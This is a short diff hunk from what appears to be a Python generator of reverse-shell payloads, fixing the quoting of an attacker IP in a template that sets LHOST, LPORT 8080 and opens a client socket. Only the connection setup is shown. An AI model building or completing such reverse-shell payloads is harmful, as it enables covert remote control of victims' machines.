@@ -79,7 +79,7 @@ import subprocess
 import os
 import sys
 
-LHOST = """ + ip + """ # Change
+LHOST = '""" + ip + """' 
 LPORT = 8080
 client = socket.socket()
 print("[-] Connection Initiating...")
